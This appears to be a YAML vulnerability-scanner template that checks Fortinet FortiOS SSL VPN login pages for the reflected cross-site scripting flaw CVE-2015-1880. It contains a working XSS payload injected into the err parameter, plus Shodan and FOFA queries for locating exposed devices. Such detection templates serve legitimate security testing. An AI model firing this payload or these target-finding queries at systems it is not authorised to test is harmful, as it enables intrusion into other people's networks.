http:
- matchers:
  - part: body
    type: word
    words:
    - <script>alert('{{randstr}}')</script>
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/remote/login?&err=--%3E%3Cscript%3Ealert(''{{randstr}}'')%3C/script%3E%3C!--&lang=en'
id: CVE-2015-1880
info:
  author: pikpikcu
  classification:
    cpe: cpe:2.3:o:fortinet:fortios:5.2.0:*:*:*:*:*:*:*
    cve-id: CVE-2015-1880
    cvss-metrics: CVSS:2.0/AV:N/AC:M/Au:N/C:N/I:P/A:N
    cvss-score: 4.3
    cwe-id: CWE-79
    epss-percentile: 0.98148
    epss-score: 0.59363
  description: Fortinet FortiOS 5.2.x before 5.2.3 contains a cross-site scripting
    vulnerability in the SSL VPN login page which allows remote attackers to inject
    arbitrary web script or HTML via unspecified vectors.
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary script code in the context of the victim''s browser, potentially
    leading to session hijacking, defacement, or theft of sensitive information.

    '
  metadata:
    fofa-query:
    - body="/remote/login" "xxxxxxxx"
    - icon_hash=945408572
    max-request: 1
    product: fortios
    shodan-query:
    - http.html:"/remote/login" "xxxxxxxx"
    - http.favicon.hash:945408572
    - cpe:"cpe:2.3:o:fortinet:fortios"
    - port:10443 http.favicon.hash:945408572
    vendor: fortinet
  name: Fortinet FortiOS <=5.2.3 - Cross-Site Scripting
  reference:
  - https://www.c2.lol/articles/xss-in-fortigates-ssl-vpn-login-page
  - http://www.fortiguard.com/advisory/FG-IR-15-005/
  - https://nvd.nist.gov/vuln/detail/CVE-2015-1880
  - http://www.securitytracker.com/id/1032261
  - http://www.securitytracker.com/id/1032262
  remediation: 'Upgrade Fortinet FortiOS to a version higher than 5.2.3 to mitigate
    this vulnerability.

    '
  severity: medium
  tags: cve2015,cve,xss,fortigates,intrusive,fortinet,vuln
